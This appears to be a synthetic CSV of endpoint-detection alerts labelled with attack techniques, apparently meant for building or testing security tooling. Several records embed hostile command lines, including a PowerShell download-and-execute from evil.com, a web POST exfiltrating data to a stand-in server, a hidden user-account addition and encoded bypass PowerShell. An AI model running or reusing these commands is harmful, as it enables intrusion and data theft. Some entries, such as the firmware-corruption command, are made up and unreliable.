event_id,event_type,event_timestamp,event_category,event_description,severity,event_time,category,mitre_technique,host,event_severity,affected_hosts,event_details,action,detect_description,detect_id,technique,src_ip,src_port,protocol,user_name,process_name,technique_name,affected_host,affected_process,affected_file_path,command_line,parent_process,parent_process_command_line,detection_method,recommended_actions,event_version,event_data,event_name,endpoint,data,rule_name,recommendation,event_subtype,container_name,image_name,image_digest,registry,command,source_ip,destination_ip,process_path,username,detection,actor,host_info,event_url,event_hash,detected_by,details,device,source,target,attack_name,tactic,ip_address,process_id,metadata,alert_type,timestamp,detection_info,sensor_id,hostname,ip,user,domain,process_command_line,process_pid,parent_process_name,parent_process_pid,c2,files,detection_source,web_server_url,web_server_method,type,process,network,event,trigger,remediation,artifact_hiding,process_injection,security_control_disablement,file_deletion,name,affected_entities,dst_ip,kill_chain_phases,file,process_execution,registry_modification,cloud_infrastructure_modification,subtype,detection_details,customer_id,event_info,product,mitre,attack_details,description,destination_port,parent_process_id,email_sender,email_recipient,email_subject,email_urls,email_attachments,Severity,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,Recommendation,Title,Tactic,Technique,Affected_Image_Path,Injected_Process_Name,Parent_Process_Name,Injection_Technique,indicators,actions,additional_info,file_info,network_info,Timestamp,Description,Loader_Process_Name,Loader_Technique,event_Source,tactics,recommendations,ip_addresses,mac_addresses,operating_system,agent_version,group_name,destination,threat_severity,threat_category,threat_name,ioc,tags,detect_name,rule_description,triggered_rule,alert_rule_name,alert_rule_id,alert_state,alert_time,src,process_tree,remediation_steps,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,EventID,Category,AffectedHostInfo,DetectionDetails,endpoint_id,web_service_name,web_service_path,ioc_type,ioc_value,process_details,host_details,DetectionId,Details,event_action,event_source,status,application,threat,source_port,file_write,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFilePath,AffectedFileSize,technique_id,event_creator,subtechnique_id,subtechnique,remote_server,mitre_attack_id,cloud_account,org_id,event_event_name,data_source,device_name,file_name,file_size,src_path,dst_path,host_name,file_path,md5_hash,sha256_hash,alert_data,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,file_permission_modification,Domain_Controller_IP,Domain_Controller_Name,combined_data
9492hbd092,DetectionSummaryEvent,,direct volume access,An attempt to access a volume directly has been detected.,High,2023-03-10T12:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint Detection and Response,"{'process': {'name': 'cmd.exe', 'pid': '123', 'command_line': 'cmd.exe /c net user test test123 /add'}, 'volume': {'name': 'C:', 'access_type': 'Direct', 'operation': 'Write'}}","{'id': 'Endpoint1', 'hostname': 'MyComputer', 'ip_address': '192.168.1.100', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 9492hbd092. event_type is DetectionSummaryEvent. event_category is direct volume access. event_description is An attempt to access a volume directly has been detected.. severity is High. event_time is 2023-03-10T12:00:00Z. detected_by is Endpoint Detection and Response. details process name is cmd.exe. details process pid is 123. details process command_line is cmd.exe /c net user test test123 /add. details volume name is C:. details volume access_type is Direct. details volume operation is Write. device id is Endpoint1. device hostname is MyComputer. device ip_address is 192.168.1.100. device os is Windows 10. 
09430t0dj,threat detection,2023-03-09T12:00:00.000000Z,Dynamic resolution,Dynamic Resolution detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'type': 'endpoint', 'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.101'}","{'type': 'process', 'process_name': 'chrome.exe', 'process_command_line': 'chrome.exe www.maliciousdomain.com', 'process_id': '1234'}",Dynamic Resolution,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 09430t0dj. event_type is threat detection. event_timestamp is 2023-03-09T12:00:00.000000Z. event_category is Dynamic resolution. event_description is Dynamic Resolution detected. severity is high. source type is endpoint. source hostname is DESKTOP-ABC123. source ip_address is 192.168.1.101. target type is process. target process_name is chrome.exe. target process_command_line is chrome.exe www.maliciousdomain.com. target process_id is 1234. attack_name is Dynamic Resolution. tactic is Defense Evasion. 
123456,alert,,encrypted channel,Encrypted Channel detected,,2023-03-09T12:00:00.000000Z,,,,medium,,,,,,,,,,,powershell.exe,,,,,powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA= ,,,,,,,,,,Encrypted Channel,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.101,1234.0,"{'customerID': '12345', 'machineName': 'DESKTOP-ABC123', 'domain': 'contoso.com'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 123456. event_type is alert. event_category is encrypted channel. event_description is Encrypted Channel detected. event_time is 2023-03-09T12:00:00.000000Z. event_severity is medium. process_name is powershell.exe. command_line is powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA= . rule_name is Encrypted Channel. ip_address is 192.168.1.101. metadata customerID is 12345. metadata machineName is DESKTOP-ABC123. metadata domain is contoso.com. 
12345,alert,1646749655000,,,,2022-03-08T14:32:47Z,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,"{'rule_name': 'MITRE ATT&CK T1499 Endpoint Denial of Service', 'rule_description': 'Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.', 'rule_severity': 'high', 'rule_id': 'MITRE_ID_T1499', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'delivery'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'exploitation'}], 'event_type': 'endpoint-dos', 'event_description': 'Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.', 'event_category': 'Denial of Service', 'source': {'process_name': 'cmd.exe', 'command_line': 'cmd.exe /c ping -n 10000 127.0.0.1', 'process_id': '1224'}, 'user_info': {'user_name': 'acme\\jdoe'}, 'host_info': {'hostname': 'WIN10-PC', 'domain': 'acme.local', 'ip_address': '192.168.1.101'}, 'metadata': {'alert_link': 'https://securitycenter.windows.com/alert/1234567890'}, 'recommendation': 'Isolate the affected machine from the network to prevent further damage and investigate the root cause of the attack.'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 12345. event_type is alert. event_timestamp is 1646749655000. event_time is 2022-03-08T14:32:47Z. data rule_name is MITRE ATT&CK T1499 Endpoint Denial of Service. data rule_description is Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.. data rule_severity is high. data rule_id is MITRE_ID_T1499. data kill_chain_phases is {'kill_chain_name': 'mitre-attack', 'phase_name': 'delivery'}. data kill_chain_phases is {'kill_chain_name': 'mitre-attack', 'phase_name': 'exploitation'}. data event_type is endpoint-dos. data event_description is Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.. data event_category is Denial of Service. data source process_name is cmd.exe. data source command_line is cmd.exe /c ping -n 10000 127.0.0.1. data source process_id is 1224. data user_info user_name is acme\jdoe. data host_info hostname is WIN10-PC. data host_info domain is acme.local. data host_info ip_address is 192.168.1.101. data metadata alert_link is https://securitycenter.windows.com/alert/1234567890. data recommendation is Isolate the affected machine from the network to prevent further damage and investigate the root cause of the attack.. "
12345,threat_detection,1646749655000,execution gaurdrails,Execution Guardrails Detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'id': 'ABC123', 'hostname': 'Workstation-01', 'ip': '192.168.1.100', 'os': 'Windows 10', 'username': 'John.Doe', 'process_name': 'cmd.exe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,suspicious_activity,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is threat_detection. event_timestamp is 1646749655000. event_category is execution gaurdrails. event_description is Execution Guardrails Detected. severity is high. endpoint id is ABC123. endpoint hostname is Workstation-01. endpoint ip is 192.168.1.100. endpoint os is Windows 10. endpoint username is John.Doe. endpoint process_name is cmd.exe. alert_type is suspicious_activity. 
12345,DetectionSummaryEvent,,data exfiltration,Exfiltration Over Alternative Protocol,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'example-hostname', 'domain': 'example-domain', 'os': 'Windows 10'}",,,,,,,,,,,,,,2023-03-08T12:00:00.000000Z,"{'detection_id': '12345678-1234-1234-1234-123456789012', 'detection_name': 'Exfiltration Detection', 'detection_description': 'Detects exfiltration over alternative protocol', 'detection_time': '2023-03-08T12:00:00.000000Z', 'rule_name': 'Exfiltration Detection Rule', 'rule_id': '12345678-1234-1234-1234-123456789012', 'ioc_info': {'ioc_type': 'protocol', 'ioc_value': 'DNS', 'ioc_description': 'Alternative exfiltration protocol'}, 'command_line': 'nslookup example.com 8.8.8.8'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is DetectionSummaryEvent. event_category is data exfiltration. event_description is Exfiltration Over Alternative Protocol. severity is high. host_info hostname is example-hostname. host_info domain is example-domain. host_info os is Windows 10. timestamp is 2023-03-08T12:00:00.000000Z. detection_info detection_id is 12345678-1234-1234-1234-123456789012. detection_info detection_name is Exfiltration Detection. detection_info detection_description is Detects exfiltration over alternative protocol. detection_info detection_time is 2023-03-08T12:00:00.000000Z. detection_info rule_name is Exfiltration Detection Rule. detection_info rule_id is 12345678-1234-1234-1234-123456789012. detection_info ioc_info ioc_type is protocol. detection_info ioc_info ioc_value is DNS. detection_info ioc_info ioc_description is Alternative exfiltration protocol. detection_info command_line is nslookup example.com 8.8.8.8. 
12345,threat detection,1646749655000,data exfiltration,Exfiltration Over C2 Channel Detected,high,,,,,,,,detect,,,,,,,,powershell.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABC123,DESKTOP-ABC123,192.168.1.100,JohnDoe,DOMAIN,powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'),1234.0,explorer.exe,5678.0,"{'destination': 'evil.com', 'protocol': 'HTTP'}","[{'name': 'SensitiveData.txt', 'type': 'exfiltrated'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is threat detection. event_timestamp is 1646749655000. event_category is data exfiltration. event_description is Exfiltration Over C2 Channel Detected. severity is high. action is detect. process_name is powershell.exe. sensor_id is ABC123. hostname is DESKTOP-ABC123. ip is 192.168.1.100. user is JohnDoe. domain is DOMAIN. process_command_line is powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'). parent_process_name is explorer.exe. c2 destination is evil.com. c2 protocol is HTTP. files name is SensitiveData.txt. files type is exfiltrated. 
12345,threat detection,1646749655000,data exfiltration,Exfiltration Over Physical Medium Detected,high,,,,,,,,,,,,,,"{'name': 'USB', 'direction': 'outbound'}",,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABC123,DESKTOP-ABC123,192.168.1.100,JohnDoe,DOMAIN,explorer.exe copy SensitiveData.txt E:\,1234.0,,,,"[{'name': 'SensitiveData.txt', 'type': 'exfiltrated'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is threat detection. event_timestamp is 1646749655000. event_category is data exfiltration. event_description is Exfiltration Over Physical Medium Detected. severity is high. protocol name is USB. protocol direction is outbound. process_name is explorer.exe. sensor_id is ABC123. hostname is DESKTOP-ABC123. ip is 192.168.1.100. user is JohnDoe. domain is DOMAIN. process_command_line is explorer.exe copy SensitiveData.txt E:\. files name is SensitiveData.txt. files type is exfiltrated. 
12345678-1234-1234-1234-123456789012,threat detection,2023-03-08T14:30:00Z,exfiltration over web service,Exfiltration Over Web Service Detected,,,,,,high,,,,,,,,,,,explorer.exe,,,,,powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678.0,,,,,,,,,,,,,,,,Microsoft Defender for Endpoint,http://exfiltration-server.com,POST,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345678-1234-1234-1234-123456789012. event_type is threat detection. event_timestamp is 2023-03-08T14:30:00Z. event_category is exfiltration over web service. event_description is Exfiltration Over Web Service Detected. event_severity is high. process_name is explorer.exe. command_line is powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data. detection_source is Microsoft Defender for Endpoint. web_server_url is http://exfiltration-server.com. web_server_method is POST. 
12345,alert,1646749655000,Attempted Attack,An attempt was made to exploit a public-facing application on the host.,,,,,"{'hostname': 'host-123', 'ip_address': '192.168.0.1', 'mac_address': '00:11:22:33:44:55'}",,,,Exploit Public-Facing Application,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T10:30:00.000Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is alert. event_timestamp is 1646749655000. event_category is Attempted Attack. event_description is An attempt was made to exploit a public-facing application on the host.. host hostname is host-123. host ip_address is 192.168.0.1. host mac_address is 00:11:22:33:44:55. action is Exploit Public-Facing Application. timestamp is 2023-03-04T10:30:00.000Z. 
12345,alert,2022-03-17T14:30:00Z,Exploitation for Client Execution,Possible Exploitation for Client Execution,high,,,,,,,"{'technique': 'Exploitation for Client Execution', 'affected_process': 'explorer.exe', 'process_id': '1234'}",detect,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'module': 'endpoint', 'product': 'falcon', 'sensor_id': '1234567890abcdef', 'hostname': 'WIN-12345', 'ip_address': '192.168.1.100', 'user': 'DOMAIN\\user'}",,,,,,,,,,,,,,,,,,,,,,,,anomaly,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is alert. event_timestamp is 2022-03-17T14:30:00Z. event_category is Exploitation for Client Execution. event_description is Possible Exploitation for Client Execution. severity is high. event_details technique is Exploitation for Client Execution. event_details affected_process is explorer.exe. event_details process_id is 1234. action is detect. source module is endpoint. source product is falcon. source sensor_id is 1234567890abcdef. source hostname is WIN-12345. source ip_address is 192.168.1.100. source user is DOMAIN\user. type is anomaly. 
12345,evade detection,1646749655000,exploit for defensive evasion,An attempt to exploit a vulnerability in order to evade detection or maintain persistence.,high,,,,"{'hostname': 'server01', 'ip_address': '192.168.1.100'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'ioc': [{'type': 'File Hash', 'value': 'f1a4f16db921e4c4efc6b51a6b10a6f7'}, {'type': 'URL', 'value': 'https://malicious-site.com/exploit'}], 'reason': 'Exploit detected'}",,,,,,,,,,,,,,,,,,,,,{'username': 'admin'},,,,,,,,,,,,"{'process_name': 'cmd.exe', 'process_id': '1234', 'file_path': 'C:\\Windows\\system32\\cmd.exe', 'command_line': 'cmd.exe /c echo hello world'}","{'protocol': 'TCP', 'port': '4444', 'remote_address': '192.168.1.100'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 12345. event_type is evade detection. event_timestamp is 1646749655000. event_category is exploit for defensive evasion. event_description is An attempt to exploit a vulnerability in order to evade detection or maintain persistence.. severity is high. host hostname is server01. host ip_address is 192.168.1.100. detection ioc is {'type': 'File Hash', 'value': 'f1a4f16db921e4c4efc6b51a6b10a6f7'}. detection ioc is {'type': 'URL', 'value': 'https://malicious-site.com/exploit'}. detection reason is Exploit detected. user username is admin. process process_name is cmd.exe. process process_id is 1234. process file_path is C:\Windows\system32\cmd.exe. process command_line is cmd.exe /c echo hello world. network protocol is TCP. network port is 4444. network remote_address is 192.168.1.100. "
12345,alert,1646749655000,external remote services,A connection to an external remote service has been detected.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,Potential External Remote Services Connection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'type': 'network', 'subtype': 'socket', 'event_timestamp': '2022-04-01T14:30:00Z', 'src_ip': '', 'dst_ip': '10.0.0.2', 'src_port': '', 'dst_port': '8080', 'protocol': 'tcp', 'http': {'full_uri': 'http://10.0.0.2:8080', 'user_agent': '', 'referer': '', 'request_method': '', 'response_status_code': ''}, 'remote_service': {'name': 'Unknown', 'type': 'Unknown', 'ports': ['8080', '8443'], 'ipv4': '10.0.0.2', 'ipv6': '', 'url': 'http://10.0.0.2:8080', 'certificate': '', 'encryption': 'Unknown', 'authentication': 'Unknown', 'version': 'Unknown', 'product': 'Unknown', 'organization': 'Unknown'}, 'process': {'cmdline': 'explorer.exe /root,C:\\Windows\\system32', 'path': 'C:\\Windows\\explorer.exe', 'pid': 1234, 'name': 'explorer.exe'}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 12345. event_type is alert. event_timestamp is 1646749655000. event_category is external remote services. event_description is A connection to an external remote service has been detected.. severity is high. event_name is Potential External Remote Services Connection. event type is network. event subtype is socket. event event_timestamp is 2022-04-01T14:30:00Z. event src_ip is . event dst_ip is 10.0.0.2. event src_port is . event dst_port is 8080. event protocol is tcp. event http full_uri is http://10.0.0.2:8080. event http user_agent is . event http referer is . event http request_method is . event http response_status_code is . event remote_service name is Unknown. event remote_service type is Unknown. event remote_service ports is ['8080', '8443']. event remote_service ipv4 is 10.0.0.2. event remote_service ipv6 is . event remote_service url is http://10.0.0.2:8080. event remote_service certificate is . event remote_service encryption is Unknown. event remote_service authentication is Unknown. event remote_service version is Unknown. event remote_service product is Unknown. event remote_service organization is Unknown. event process cmdline is explorer.exe /root,C:\Windows\system32. event process path is C:\Windows\explorer.exe. event process pid is 1234. event process name is explorer.exe. "
123456,alert,,fallback channels,Fallback communication channel detected,,2023-03-09T12:00:00.000000Z,,,,medium,,,,,,,,,,,powershell.exe,,,,,powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA=,,,,,,,,,,Fallback Channels,,,,,,,,,,,,,,,,,,,,,,,,,1234.0,,,,,,,,,,,,,,,,,,,,,"{'protocol': 'http', 'dst_ip': '192.168.1.100', 'dst_port': '80'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 123456. event_type is alert. event_category is fallback channels. event_description is Fallback communication channel detected. event_time is 2023-03-09T12:00:00.000000Z. event_severity is medium. process_name is powershell.exe. command_line is powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA=. rule_name is Fallback Channels. network protocol is http. network dst_ip is 192.168.1.100. network dst_port is 80. 
12345,Firmware Corruption,,firmware corruption,Crowdstrike Falcon detected firmware corruption on endpoint.,High,2022-03-06T09:18:56Z,,,"{'hostname': 'DESKTOP-ABC123', 'machine_id': '12345'}",,,,,,,,,,,,,,,,,,,,EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'cmd.exe', 'command_line': 'cmd.exe /c rundll32.exe bios.dll,CorruptFirmware'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 12345. event_type is Firmware Corruption. event_category is firmware corruption. event_description is Crowdstrike Falcon detected firmware corruption on endpoint.. severity is High. event_time is 2022-03-06T09:18:56Z. host hostname is DESKTOP-ABC123. host machine_id is 12345. detection_method is EDR. process process_name is cmd.exe. process command_line is cmd.exe /c rundll32.exe bios.dll,CorruptFirmware. "
12345,alert,1646749655000,hardware additions,This alert is triggered when new hardware is detected on the endpoint.,HIGH,,,,,,,,,Hardware addition detected on endpoint,,Hardware Additions,,,,,,,,,,,,,,,,,Possible Hardware Additions Detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'tags': ['T1200', 'Hardware Additions', 'Endpoint Detection']}",,,,,,,,,,,,,,,,,,,,,,"{'event': {'type': 'HardwareAddition', 'detection_id': '12345', 'device_type': 'Physical'}}","{'action': ['Investigate the hardware addition to determine if it is legitimate or unauthorized', 'If the hardware is unauthorized, remove it from the endpoint immediately', 'Consider implementing endpoint security controls to prevent unauthorized hardware additions']}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 12345. event_type is alert. event_timestamp is 1646749655000. event_category is hardware additions. event_description is This alert is triggered when new hardware is detected on the endpoint.. severity is HIGH. detect_description is Hardware addition detected on endpoint. technique is Hardware Additions. event_name is Possible Hardware Additions Detected. metadata tags is T1200. metadata tags is Hardware Additions. metadata tags is Endpoint Detection. trigger event type is HardwareAddition. trigger event detection_id is 12345. trigger event device_type is Physical. remediation action is Investigate the hardware addition to determine if it is legitimate or unauthorized. remediation action is If the hardware is unauthorized, remove it from the endpoint immediately. remediation action is Consider implementing endpoint security controls to prevent unauthorized hardware additions. "
